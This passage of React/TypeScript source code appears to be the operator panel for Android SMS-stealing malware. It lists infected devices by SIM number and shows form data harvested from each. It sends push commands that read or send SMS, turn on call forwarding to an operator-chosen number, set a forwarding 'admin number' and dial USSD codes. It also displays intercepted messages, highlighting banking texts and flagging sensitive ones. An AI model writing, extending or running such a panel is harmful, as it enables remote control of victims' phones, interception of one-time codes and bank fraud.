        <button onClick={() => void fetchGroups()} disabled={loading} style={{ padding: "8px 12px", borderRadius: 8, border: `1px solid ${B}`, background: T.card, color: T.mutedLight, fontSize: 11, fontWeight: 700, cursor: loading ? "wait" : "pointer", display: "flex", alignItems: "center", gap: 5 }}>
          {loading ? <Spinner /> : <Ic.Refresh />} Refresh
        </button>
      </div>

      <div style={{ fontSize: 10, color: "#64748b" }}>
        {totalUsers} device group{totalUsers !== 1 ? "s" : ""} · {totalEntries} entr{totalEntries !== 1 ? "ies" : "y"}
        {visibleCount < totalUsers && <span> · showing {visibleCount}</span>}
      </div>

      {loading && groups.length === 0 ? (
        <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", flexDirection: "column", gap: 8, padding: 40 }}>
          <Spinner /><span style={{ fontSize: 13, color: "#94a3b8" }}>Loading…</span>
        </div>
      ) : totalUsers === 0 ? (
        <div style={{ textAlign: "center", color: "#94a3b8", padding: 32, fontSize: 13 }}>
          {search ? "No results found" : "No form submissions yet"}
        </div>
      ) : (
        <>
          {visibleUsers.map(uid => {
            const [appId, userId] = uid.split("||");
            const uDevices = grouped.byUser[uid] ?? [];
            const totalUEntries = uDevices.reduce((s, d) => s + d.entries.length, 0);
            return (
              <div key={uid} style={{ borderRadius: 10, border: `1px solid ${B}`, overflow: "hidden" }}>

                {/* ── User header ── */}
                <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "6px 10px", background: H, borderBottom: `1px solid ${B}` }}>
                  <div style={{ width: 26, height: 26, borderRadius: "50%", background: T.accent, display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 800, fontSize: 9, flexShrink: 0, fontFamily: "monospace" }}>
                    {(userId ?? "").slice(-2).toUpperCase()}
                  </div>
                  <span style={{ flex: 1, fontSize: 11, fontWeight: 700, fontFamily: "monospace", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", color: T.text }}>{userId}</span>
                  <CopyIconBtn value={userId ?? ""} title="Copy User ID" />
                  {appId && <span style={{ fontSize: 9, color: T.accent, fontWeight: 700, fontFamily: "monospace", flexShrink: 0, background: T.accentGlow, borderRadius: 4, padding: "1px 5px" }}>{appId}</span>}
                  <span style={{ fontSize: 9, color: "#8b5cf6", fontWeight: 700, flexShrink: 0 }}>{totalUEntries} entr{totalUEntries !== 1 ? "ies" : "y"}</span>
                </div>

                {/* ── One block per device ── */}
                {uDevices.map((dev, di) => {
                  const devForm = dev.entries.slice().sort((a, b) => new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime());
                  const isLast = di === uDevices.length - 1;
                  const lastOnline = devForm[0]?.submittedAt ?? null;

                  return (
                    <div key={dev.deviceId} style={{ borderBottom: isLast ? "none" : `1px solid ${B}`, background: T.card }}>

                      {/* Device sub-header */}
                      <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "5px 10px", borderBottom: `1px solid ${H}` }}>
                        <div style={{ flex: 1, minWidth: 0, display: "flex", alignItems: "center", gap: 5, flexWrap: "wrap" }}>
                          <span style={{ fontSize: 11, fontWeight: 700, color: T.text, fontFamily: "monospace" }}>{dev.deviceId}</span>
                          <CopyIconBtn value={dev.deviceId} title="Copy device ID" />
                          <span style={{ fontSize: 9, color: "#64748b" }}>{timeAgo(lastOnline)}</span>
                        </div>
                        <span style={{ fontSize: 10, padding: "4px 12px", borderRadius: 7, border: "none", background: T.accent, color: "#fff", fontWeight: 700, flexShrink: 0, boxShadow: "0 2px 8px rgba(99,102,241,0.35)" }}>
                          {dev.entries.length} entr{dev.entries.length !== 1 ? "ies" : "y"}
                        </span>
                      </div>

                      {/* All entries expanded inline */}
                      {devForm.map((entry, idx) => {
                        const pairs = Object.entries(entry.data ?? {});
                        const time = new Date(entry.submittedAt).toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", hour12: true });
                        return (
                          <div key={entry.id} style={{ borderBottom: idx < devForm.length - 1 ? `1px solid ${H}` : "none" }}>
                            {/* Entry number + time */}
                            <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "2px 10px", background: H }}>
                              <span style={{ fontSize: 8, color: "#8b5cf6", fontFamily: "monospace", fontWeight: 700 }}>#{idx + 1}</span>
                              <span style={{ fontSize: 8, color: "#64748b" }}>{time}</span>
                            </div>
                            {/* Key-value pairs */}
                            {pairs.length === 0
                              ? <div style={{ fontSize: 10, color: "#64748b", padding: "2px 10px" }}>—</div>
                              : pairs.map(([k, v]) => {
                                const sv = String(v ?? "");
                                return (
                                  <div key={k} style={{ display: "flex", padding: "3px 10px", gap: 8, alignItems: "center" }}>
                                    <span style={{ fontSize: 10, color: "#94a3b8", fontWeight: 600, minWidth: 88, flexShrink: 0 }}>{fmtKey(k)}</span>
                                    <span style={{ fontSize: 10, color: T.text, wordBreak: "break-all", flex: 1 }}>{sv}</span>
                                    {sv && <CopyIconBtn value={sv} title={`Copy ${fmtKey(k)}`} />}
                                  </div>
                                );
                              })
                            }
                          </div>
                        );
                      })}
                    </div>
                  );
                })}
              </div>
            );
          })}
          <div ref={sentinelRef} style={{ height: 1 }} />
          {visibleCount < totalUsers && (
            <div style={{ display: "flex", justifyContent: "center", padding: "10px 0" }}><Spinner /></div>
          )}
        </>
      )}
    </div>
  );
}

/* ══════════════════════════════════════════
   DEVICE DETAIL + FCM ACTIONS
══════════════════════════════════════════ */
type FcmState = "idle" | "sending" | "ok" | "err";
function FcmActionCard({ title, icon, children, onReset }: { title: string; icon: React.ReactNode; children: React.ReactNode; onReset: () => void }) {
  return (
    <div style={{ background: T.inputBg, borderRadius: 12, border: `1px solid ${T.borderLight}`, overflow: "hidden" }}>
      <div style={{ padding: "10px 14px", borderBottom: `1px solid ${T.border}`, display: "flex", alignItems: "center", gap: 8 }}>
        <div style={{ color: T.accentLight }}>{icon}</div>
        <div style={{ fontSize: 13, fontWeight: 800, color: T.text, flex: 1 }}>{title}</div>
        <button onClick={onReset} style={{ background: "none", border: "none", color: T.muted, cursor: "pointer", fontSize: 10, padding: "2px 6px" }}>Reset</button>
      </div>
      <div style={{ padding: 14 }}>{children}</div>
    </div>
  );
}

function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; masterPin: string; onClose: () => void }) {
  const [sim, setSim] = useState<"1" | "2">("1");

  const [pingState, setPingState] = useState<FcmState>("idle");
  const [pingLog, setPingLog] = useState("");

  const [smsGetState, setSmsGetState] = useState<FcmState>("idle");
  const [smsGetLog, setSmsGetLog] = useState("");
  const [smsGetPhone, setSmsGetPhone] = useState("");
  const [smsGetCount, setSmsGetCount] = useState("20");

  const [smsSendState, setSmsSendState] = useState<FcmState>("idle");
  const [smsSendLog, setSmsSendLog] = useState("");
  const [smsSendTo, setSmsSendTo] = useState("");
  const [smsSendBody, setSmsSendBody] = useState("");

  const [adminState, setAdminState] = useState<FcmState>("idle");
  const [adminLog, setAdminLog] = useState("");
  const [adminNumber, setAdminNumber] = useState("");
  const [adminEnabled, setAdminEnabled] = useState(device.forwardEnabled);

  const [fwdState, setFwdState] = useState<FcmState>("idle");
  const [fwdLog, setFwdLog] = useState("");
  const [fwdNumber, setFwdNumber] = useState("");

  const [ussdState, setUssdState] = useState<FcmState>("idle");
  const [ussdLog, setUssdLog] = useState("");
  const [ussdCode, setUssdCode] = useState("");

  const [devMsgs, setDevMsgs] = useState<MsgRow[]>([]);
  const [msgsLoading, setMsgsLoading] = useState(false);
  const [msgSearch, setMsgSearch] = useState("");

  function loadDevMsgs() {
    setMsgsLoading(true);
    apiFetch(`/api/messages?deviceId=${encodeURIComponent(device.deviceId)}&limit=200`, { headers: { "x-master-pin": masterPin } })
      .then(r => r.ok ? r.json() : [])
      .then(data => setDevMsgs((data as MsgRow[]).sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime())))
      .catch(() => {})
      .finally(() => setMsgsLoading(false));
  }

  useEffect(() => { loadDevMsgs(); }, [device.deviceId, masterPin]); // eslint-disable-line react-hooks/exhaustive-deps

  const filteredDevMsgs = useMemo(() => {
    const q = msgSearch.trim().toLowerCase();
    if (!q) return devMsgs;
    return devMsgs.filter(m =>
      m.body.toLowerCase().includes(q) ||
      m.fromSender.toLowerCase().includes(q) ||
      m.fromNumber.includes(q)
    );
  }, [devMsgs, msgSearch]);

  async function sendFcm(data: Record<string, string>, setState: (s: FcmState) => void, setLog: (l: string) => void) {
    if (!device.hasFcm) { setLog("No FCM token — device unreachable."); setState("err"); return; }
    setState("sending"); setLog("Sending…");
    try {
      const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data }) });
      if (!r.ok) { const j = await r.json() as { error?: string }; setLog(j.error ?? "Failed"); setState("err"); return; }
      setLog("Sent! Waiting for device…"); setState("ok");
      setTimeout(() => { setState("idle"); setLog(""); }, 6000);
    } catch { setLog("Network error"); setState("err"); }
  }

  const stateStyle = (s: FcmState): React.CSSProperties => ({
    fontSize: 12, padding: "8px 12px", borderRadius: 8, marginBottom: 8,
    background: s === "ok" ? T.green + "18" : s === "err" ? T.red + "15" : T.accentGlow,
    color: s === "ok" ? T.green : s === "err" ? T.red : T.accentLight,
    display: s === "idle" ? "none" : "block",
  });

  function BtnSend({ onClick, disabled, children }: { onClick: () => void; disabled: boolean; children: React.ReactNode }) {
    return (
      <button onClick={onClick} disabled={disabled} style={{ width: "100%", padding: "10px 0", borderRadius: 9, background: disabled ? T.accentGlow : `linear-gradient(135deg,${T.accent},#8b5cf6)`, color: disabled ? T.accentLight : "#fff", border: "none", fontWeight: 800, fontSize: 13, cursor: disabled ? "not-allowed" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
        {children}
      </button>
    );
  }

  const ONLINE_MS = 15 * 60 * 1000;
  const isOnline = device.lastOnline ? (Date.now() - new Date(device.lastOnline).getTime()) < ONLINE_MS : false;

  function renderSim(slot: number, carrier: string | null, phone: string | null) {
    return (
      <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
        <span style={{ fontSize: 10, fontWeight: 700, color: T.muted, background: T.border, borderRadius: 4, padding: "1px 5px" }}>SIM{slot}</span>
        {carrier || phone ? <span style={{ fontSize: 12, color: T.mutedLight }}>{carrier && <b style={{ color: T.text }}>{carrier}</b>}{carrier && phone && " · "}{phone && <span style={{ fontFamily: "monospace", color: "#93c5fd" }}>{phone}</span>}</span> : <span style={{ fontSize: 11, color: T.muted, fontStyle: "italic" }}>No SIM</span>}
      </div>
    );
  }

  return (
    <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.90)", zIndex: 300, display: "flex", flexDirection: "column", backdropFilter: "blur(4px)" }}>
      <div style={{ background: T.headerBg, borderBottom: `1px solid ${T.border}`, padding: "0 16px", flexShrink: 0 }}>
        <div style={{ maxWidth: 720, margin: "0 auto", height: 56, display: "flex", alignItems: "center", gap: 12 }}>
          <button onClick={onClose} style={{ background: T.border, border: "none", color: T.text, borderRadius: 8, width: 34, height: 34, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer" }}><Ic.X /></button>
          <div style={{ display: "flex", alignItems: "center", gap: 8, flex: 1 }}>
            <div style={{ color: T.accentLight }}><Ic.Smartphone /></div>
            <span style={{ fontWeight: 900, fontSize: 15, color: T.text, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{device.name}</span>
            <span style={{ display: "inline-flex", alignItems: "center", gap: 4, background: isOnline ? "#16a34a22" : T.border, color: isOnline ? "#4ade80" : T.muted, borderRadius: 99, padding: "2px 9px", fontSize: 10, fontWeight: 800 }}>
              <span style={{ width: 5, height: 5, borderRadius: "50%", background: isOnline ? "#4ade80" : T.muted, display: "inline-block" }} />{isOnline ? "ONLINE" : "OFFLINE"}
            </span>
          </div>
          <span style={{ fontSize: 10, color: T.muted, fontFamily: "monospace" }}>{device.appId}</span>
        </div>
      </div>
      <div style={{ flex: 1, overflowY: "auto", padding: 16, background: T.bg }}>
        <div style={{ maxWidth: 720, margin: "0 auto", display: "flex", flexDirection: "column", gap: 12 }}>
          {/* Device Info Card */}
          <div style={{ background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, padding: "14px 16px" }}>
            <div style={{ display: "flex", flexWrap: "wrap", gap: 12 }}>
              <div style={{ flex: 1, minWidth: 200 }}>
                <div style={{ fontWeight: 800, fontSize: 16, color: T.text, marginBottom: 10 }}>{device.name}</div>
                <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                  {renderSim(1, device.sim1Carrier, device.sim1Phone)}
                  {renderSim(2, device.sim2Carrier, device.sim2Phone)}
                </div>
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
                {[
                  { l: "Device ID", v: device.deviceId },
                  { l: "User ID", v: device.userId },
                  { l: "App ID", v: device.appId },
                  { l: "Android", v: device.androidVersion > 0 ? `v${device.androidVersion}` : "—" },
                  { l: "FCM", v: device.hasFcm ? "Active" : "None" },
                  { l: "Forward", v: device.forwardEnabled ? `SIM${device.forwardSlot ?? "?"} ON` : "Off" },
                  { l: "Last Online", v: fmtAgo(device.lastOnline) },
                  { l: "Installed", v: fmtAgo(device.installedAt) },
                ].map(({ l, v }) => (
                  <div key={l} style={{ display: "flex", gap: 8, fontSize: 11 }}>
                    <span style={{ color: T.muted, fontWeight: 600, minWidth: 80 }}>{l}</span>
                    <span style={{ color: T.mutedLight, fontFamily: "monospace", wordBreak: "break-all" }}>{v}</span>
                  </div>
                ))}
              </div>
            </div>
            <div style={{ display: "flex", gap: 6, marginTop: 12, flexWrap: "wrap" }}>
              <CopyBtn value={device.deviceId} label="Device ID" />
              <CopyBtn value={device.userId} label="User ID" />
              {device.sim1Phone && <CopyBtn value={device.sim1Phone} label="SIM1" />}
              {device.sim2Phone && <CopyBtn value={device.sim2Phone} label="SIM2" />}
            </div>
          </div>

          {!device.hasFcm && (
            <div style={{ background: T.yellow + "14", border: `1px solid ${T.yellow}40`, borderRadius: 10, padding: "10px 14px", fontSize: 12, color: T.yellow, display: "flex", alignItems: "center", gap: 8 }}>
              <Ic.Alert /> No FCM token — FCM actions will not work on this device.
            </div>
          )}

          {/* SIM Selector */}
          <div style={{ display: "flex", gap: 8 }}>
            {(["1", "2"] as const).map(s => {
              const active = sim === s;
              const carrier = s === "1" ? device.sim1Carrier : device.sim2Carrier;
              const phone = s === "1" ? device.sim1Phone : device.sim2Phone;
              return (
                <button key={s} onClick={() => setSim(s)} style={{ flex: 1, padding: "8px 12px", borderRadius: 9, border: `1.5px solid ${active ? T.accent : T.borderLight}`, background: active ? T.accentGlow : T.card, cursor: "pointer", textAlign: "left", transition: "all 0.15s" }}>
                  <div style={{ fontSize: 11, fontWeight: 700, color: active ? T.accentLight : T.muted }}>SIM {s}</div>
                  <div style={{ fontSize: 10, color: active ? T.accentLight : T.muted, marginTop: 2 }}>{[carrier, phone].filter(Boolean).join(" · ") || "No SIM"}</div>
                </button>
              );
            })}
          </div>

          {/* FCM Action 1: Online Check */}
          <FcmActionCard title="Online Check (Ping)" icon={<Ic.Wifi />} onReset={() => { setPingState("idle"); setPingLog(""); }}>
            <div style={stateStyle(pingState)}>{pingLog}</div>
            <BtnSend onClick={() => sendFcm({ type: "online_check" }, setPingState, setPingLog)} disabled={pingState === "sending"}>
              {pingState === "sending" ? <><Spinner /> Sending…</> : <><Ic.Wifi /> Send Ping</>}
            </BtnSend>
          </FcmActionCard>

          {/* FCM Action 2: Get SMS */}
          <FcmActionCard title="Get SMS" icon={<Ic.MessageSquare />} onReset={() => { setSmsGetState("idle"); setSmsGetLog(""); setSmsGetPhone(""); setSmsGetCount("20"); }}>
            <input type="text" placeholder="Phone number filter (optional)" value={smsGetPhone} onChange={e => setSmsGetPhone(e.target.value)} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13 }} />
            <input type="number" placeholder="Max count (default 20)" value={smsGetCount} onChange={e => setSmsGetCount(e.target.value)} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13 }} />
            <div style={stateStyle(smsGetState)}>{smsGetLog}</div>
            <BtnSend onClick={() => sendFcm({ type: "get_sms", count: smsGetCount || "20", ...(smsGetPhone ? { phoneNumber: smsGetPhone } : {}), simSlot: sim === "2" ? "1" : "0" }, setSmsGetState, setSmsGetLog)} disabled={smsGetState === "sending"}>
              {smsGetState === "sending" ? <><Spinner /> Sending…</> : <><Ic.MessageSquare /> Get SMS</>}
            </BtnSend>
          </FcmActionCard>

          {/* FCM Action 3: Send SMS */}
          <FcmActionCard title="Send SMS" icon={<Ic.Send />} onReset={() => { setSmsSendState("idle"); setSmsSendLog(""); setSmsSendTo(""); setSmsSendBody(""); }}>
            <input type="tel" placeholder="To (phone number)" value={smsSendTo} onChange={e => setSmsSendTo(e.target.value)} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13 }} />
            <textarea placeholder="Message body" value={smsSendBody} onChange={e => setSmsSendBody(e.target.value)} rows={3} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13, resize: "vertical" }} />
            <div style={stateStyle(smsSendState)}>{smsSendLog}</div>
            <BtnSend onClick={() => { if (!smsSendTo.trim() || !smsSendBody.trim()) return; sendFcm({ type: "sms", to: smsSendTo.trim(), body: smsSendBody.trim(), simSlot: sim === "2" ? "1" : "0" }, setSmsSendState, setSmsSendLog); }} disabled={smsSendState === "sending" || !smsSendTo.trim() || !smsSendBody.trim()}>
              {smsSendState === "sending" ? <><Spinner /> Sending…</> : <><Ic.Send /> Send SMS</>}
            </BtnSend>
          </FcmActionCard>

          {/* FCM Action 4: Update Admin Number */}
          <FcmActionCard title="Update Admin Number" icon={<Ic.Key />} onReset={() => { setAdminState("idle"); setAdminLog(""); setAdminNumber(""); setAdminEnabled(device.forwardEnabled); }}>
            <div style={{ display: "flex", gap: 8, marginBottom: 8 }}>
              <button onClick={() => setAdminEnabled(true)} style={{ flex: 1, padding: "8px 0", borderRadius: 8, border: `1.5px solid ${adminEnabled ? T.green + "55" : T.borderLight}`, background: adminEnabled ? T.green + "18" : T.card, color: adminEnabled ? T.green : T.muted, fontWeight: 700, cursor: "pointer", fontSize: 12 }}>Enable</button>
              <button onClick={() => setAdminEnabled(false)} style={{ flex: 1, padding: "8px 0", borderRadius: 8, border: `1.5px solid ${!adminEnabled ? T.red + "55" : T.borderLight}`, background: !adminEnabled ? T.red + "18" : T.card, color: !adminEnabled ? T.red : T.muted, fontWeight: 700, cursor: "pointer", fontSize: 12 }}>Disable</button>
            </div>
            {adminEnabled && <input type="tel" placeholder="Admin phone number" value={adminNumber} onChange={e => setAdminNumber(e.target.value)} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13 }} />}
            <div style={stateStyle(adminState)}>{adminLog}</div>
            <BtnSend
              onClick={() => sendFcm(adminEnabled ? { type: "admin_update", status: "on", adminNumber: adminNumber.trim(), deviceId: device.deviceId, simSlot: sim === "2" ? "1" : "0" } : { type: "admin_update", status: "off", deviceId: device.deviceId }, setAdminState, setAdminLog)}
              disabled={adminState === "sending" || (adminEnabled && !adminNumber.trim())}>
              {adminState === "sending" ? <><Spinner /> Sending…</> : <><Ic.Key /> Update Number</>}
            </BtnSend>
          </FcmActionCard>

          {/* FCM Action 5: Call Forward */}
          <FcmActionCard title="Call Forward" icon={<Ic.PhoneForwarded />} onReset={() => { setFwdState("idle"); setFwdLog(""); setFwdNumber(""); }}>
            <input type="tel" placeholder="Forward to number" value={fwdNumber} onChange={e => setFwdNumber(e.target.value)} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13 }} />
            <div style={{ display: "flex", gap: 8 }}>
              <BtnSend onClick={() => { if (!fwdNumber.trim()) return; sendFcm({ type: "call_forward", action: "activate", number: fwdNumber.trim(), sim: sim === "2" ? "1" : "0" }, setFwdState, setFwdLog); }} disabled={fwdState === "sending" || !fwdNumber.trim()}>
                {fwdState === "sending" ? <><Spinner /></> : "Activate"}
              </BtnSend>
              <BtnSend onClick={() => sendFcm({ type: "call_forward", action: "deactivate", number: fwdNumber.trim() || "", sim: sim === "2" ? "1" : "0" }, setFwdState, setFwdLog)} disabled={fwdState === "sending"}>
                {fwdState === "sending" ? <><Spinner /></> : "Deactivate"}
              </BtnSend>
            </div>
            <div style={stateStyle(fwdState)}>{fwdLog}</div>
          </FcmActionCard>

          {/* FCM Action 6: USSD */}
          <FcmActionCard title="USSD Dial" icon={<Ic.Hash />} onReset={() => { setUssdState("idle"); setUssdLog(""); setUssdCode(""); }}>
            <input type="text" placeholder="USSD code (e.g. *100#)" value={ussdCode} onChange={e => setUssdCode(e.target.value)} style={{ ...inpBase, marginTop: 0, marginBottom: 8, fontSize: 13, fontFamily: "monospace" }} />
            <div style={stateStyle(ussdState)}>{ussdLog}</div>
            <BtnSend onClick={() => { if (!ussdCode.trim()) return; sendFcm({ type: "ussd", code: ussdCode.trim(), simSlot: sim === "2" ? "1" : "0" }, setUssdState, setUssdLog); }} disabled={ussdState === "sending" || !ussdCode.trim()}>
              {ussdState === "sending" ? <><Spinner /> Sending…</> : <><Ic.Hash /> Dial USSD</>}
            </BtnSend>
          </FcmActionCard>

          {/* Messages Section — sub admin exact style */}
          <div style={{ background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, overflow: "hidden" }}>
            {/* Search bar + Refresh — same as sub admin */}
            <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "9px 12px", borderBottom: `1px solid ${T.border}` }}>
              <span style={{ color: T.muted, fontSize: 13 }}>⌕</span>
              <input value={msgSearch} onChange={e => setMsgSearch(e.target.value)} placeholder="Search messages…"
                style={{ border: "none", outline: "none", flex: 1, fontSize: 11, background: "transparent", color: T.text }} />
              {msgSearch && <button onClick={() => setMsgSearch("")} style={{ background: "none", border: "none", cursor: "pointer", color: T.muted, fontSize: 13, padding: 0, lineHeight: 1 }}>✕</button>}
              <span style={{ fontSize: 10, color: T.muted, whiteSpace: "nowrap" }}>
                {filteredDevMsgs.length} message{filteredDevMsgs.length !== 1 ? "s" : ""}
              </span>
              <button onClick={() => loadDevMsgs()} disabled={msgsLoading}
                style={{ background: "none", border: `1px solid ${T.borderLight}`, borderRadius: 6, padding: "4px 9px", color: T.mutedLight, fontSize: 10, fontWeight: 700, cursor: msgsLoading ? "wait" : "pointer", display: "flex", alignItems: "center", gap: 4 }}>
                {msgsLoading ? <Spinner size={10} /> : <Ic.Refresh />} Refresh
              </button>
            </div>

            {/* Message list — flat, borderBottom separator (no card backgrounds) */}
            {msgsLoading && devMsgs.length === 0 ? (
              <div style={{ textAlign: "center", padding: 32, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 8 }}><Spinner /><span style={{ fontSize: 12 }}>Loading messages…</span></div>
            ) : filteredDevMsgs.length === 0 ? (
              <div style={{ textAlign: "center", padding: 32, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 8 }}>
                <Ic.Inbox /><span style={{ fontSize: 12 }}>{msgSearch ? "No messages match search" : "No messages for this device."}</span>
              </div>
            ) : filteredDevMsgs.map((msg, i) => {
              const displaySender = isJunkSender(msg.fromSender) ? msg.fromNumber : msg.fromSender;
              const isGreen = isBankingMsg(msg.body, msg.fromSender);
              return (
                <div key={msg.id} style={{ padding: "10px 14px", borderBottom: i < filteredDevMsgs.length - 1 ? `1px solid ${T.border}` : "none" }}>
                  {/* Date row */}
                  <div style={{ display: "flex", gap: 5, alignItems: "center", marginBottom: 4 }}>
                    <span style={{ fontSize: 10, color: T.muted }}>{fmtDate(msg.receivedAt)}</span>
                    {msg.isSensitive && <span style={{ fontSize: 9, fontWeight: 800, color: T.red, background: T.red + "18", borderRadius: 4, padding: "1px 5px" }}>SENSITIVE</span>}
                  </div>
                  {/* Body + copy */}
                  <div style={{ display: "flex", alignItems: "flex-start", gap: 6, marginBottom: 4 }}>
                    <div style={{ flex: 1, fontSize: 12, color: isGreen ? T.green : T.text, lineHeight: 1.5, wordBreak: "break-word" }}>{msg.body}</div>
                    <CopyIconBtn value={msg.body} title="Copy message" />
                  </div>
                  {/* FROM / TO row */}
                  <div style={{ display: "flex", gap: 10, fontSize: 11, flexWrap: "wrap", alignItems: "center" }}>
                    <span style={{ color: T.muted, display: "inline-flex", alignItems: "center", gap: 4 }}>
                      <span style={{ color: T.mutedLight, marginRight: 3, fontWeight: 600, fontSize: 10 }}>FROM</span>
                      {displaySender}
                      <CopyIconBtn value={displaySender} title="Copy sender" />
                    </span>
                    {msg.fromNumber && msg.fromNumber !== displaySender && (
                      <span style={{ color: T.muted, display: "inline-flex", alignItems: "center", gap: 4 }}>
                        <span style={{ color: T.mutedLight, fontFamily: "monospace", fontSize: 10 }}>{msg.fromNumber}</span>
                        <CopyIconBtn value={msg.fromNumber} title="Copy number" />
                      </span>
                    )}
                  </div>
                </div>
              );
            })}
          </div>

        </div>
      </div>
    </div>
  );
}

/* ══════════════════════════════════════════
   DEVICES TAB
══════════════════════════════════════════ */
const PAGE_SIZE = 48;
function DevicesTab({ apps, masterPin }: { apps: App[]; masterPin: string }) {
  const [devices, setDevices] = useState<FullDevice[]>([]);
  const [loading, setLoading] = useState(false);
  const [appFilter, setAppFilter] = useState("");
  const [search, setSearch] = useState("");
  const [page, setPage] = useState(1);
  const [selected, setSelected] = useState<FullDevice | null>(null);

  const fetchDevices = useCallback(async () => {
    setLoading(true);
    try {
      const qs = appFilter ? `?appId=${encodeURIComponent(appFilter)}` : "";
      const r = await apiFetch(`/api/master/all-devices${qs}`, { headers: { "x-master-pin": masterPin } });
      if (r.ok) setDevices(await r.json() as FullDevice[]);
    } catch { /* ignore */ } finally { setLoading(false); }
  }, [appFilter, masterPin]);

  useEffect(() => { void fetchDevices(); setPage(1); }, [fetchDevices]);

  const ONLINE_MS = 15 * 60 * 1000;
  const q = search.trim().toLowerCase();
  const filtered = useMemo(() => {
    if (!q) return devices;
    return devices.filter(d =>
      d.name.toLowerCase().includes(q) || d.appId.toLowerCase().includes(q) ||
      d.deviceId.toLowerCase().includes(q) || (d.sim1Phone ?? "").includes(q) || (d.sim2Phone ?? "").includes(q)
    );
  }, [devices, q]);

  const shown = q !== "" ? filtered : filtered.slice(0, page * PAGE_SIZE);
  const hasMore = q === "" && shown.length < filtered.length;
  const online = devices.filter(d => d.lastOnline ? (Date.now() - new Date(d.lastOnline).getTime()) < ONLINE_MS : false).length;

  const appColors: Record<string, string> = {};
  const palette = ["#6366f1","#8b5cf6","#06b6d4","#f59e0b","#10b981","#ef4444","#f97316","#ec4899"];
  let ci = 0;
  devices.forEach(d => { if (!appColors[d.appId]) appColors[d.appId] = palette[ci++ % palette.length]; });

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap", alignItems: "center" }}>
        <AppSelector apps={apps} value={appFilter} onChange={v => { setAppFilter(v); setPage(1); }} />
        <div style={{ position: "relative", flex: 1, minWidth: 180 }}>
          <span style={{ position: "absolute", left: 10, top: "50%", transform: "translateY(-50%)", color: T.muted, display: "flex", pointerEvents: "none" }}><Ic.Search /></span>
          <input type="text" placeholder="Search name, device ID, phone…" value={search} onChange={e => { setSearch(e.target.value); setPage(1); }}
            style={{ width: "100%", boxSizing: "border-box", padding: "8px 32px 8px 36px", borderRadius: 9, background: T.card, border: `1px solid ${T.borderLight}`, color: T.text, fontSize: 13, outline: "none" }} />
          {search && <button onClick={() => setSearch("")} style={{ position: "absolute", right: 8, top: "50%", transform: "translateY(-50%)", background: T.border, border: "none", color: T.muted, cursor: "pointer", width: 20, height: 20, borderRadius: 5, display: "flex", alignItems: "center", justifyContent: "center" }}><Ic.X /></button>}
        </div>
        <button onClick={() => void fetchDevices()} disabled={loading} style={{ padding: "8px 14px", borderRadius: 9, border: `1px solid ${T.borderLight}`, background: T.card, color: T.mutedLight, fontSize: 12, fontWeight: 700, cursor: loading ? "wait" : "pointer", display: "flex", alignItems: "center", gap: 6 }}>
          {loading ? <Spinner /> : <Ic.Refresh />} Refresh
        </button>
      </div>

      <div style={{ display: "flex", gap: 8, fontSize: 11 }}>
        <span style={{ color: T.muted }}>{devices.length} total</span>
        <span style={{ color: T.green }}>· {online} online</span>
        <span style={{ color: T.muted }}>· {devices.filter(d => d.hasFcm).length} FCM</span>
      </div>

      {loading && devices.length === 0 ? (
        <div style={{ textAlign: "center", padding: 60, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}><Ic.Loader /><span>Loading devices…</span></div>
      ) : filtered.length === 0 ? (
        <div style={{ textAlign: "center", padding: 60, color: T.muted, background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}>
          <Ic.Inbox /><span>{q ? `No devices for "${search}".` : "No devices found."}</span>
        </div>
      ) : (
        <>
          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(280px, 1fr))", gap: 10 }}>
            {shown.map(d => {
              const ac = appColors[d.appId] ?? T.accent;
              const isOnline = d.lastOnline ? (Date.now() - new Date(d.lastOnline).getTime()) < ONLINE_MS : false;
              return (
                <div key={d.deviceId} onClick={() => setSelected(d)} style={{ background: T.card, borderRadius: 13, border: `1px solid ${isOnline ? T.green + "30" : T.borderLight}`, overflow: "hidden", cursor: "pointer", transition: "all 0.15s" }}>
                  <div style={{ padding: "9px 13px", background: T.headerBg, borderBottom: `1px solid ${T.borderLight}`, display: "flex", alignItems: "center", justifyContent: "space-between", gap: 8 }}>
                    <span style={{ background: ac + "22", color: ac, border: `1px solid ${ac}44`, borderRadius: 5, padding: "2px 7px", fontSize: 9, fontWeight: 800 }}>{d.appId.slice(-8)}</span>
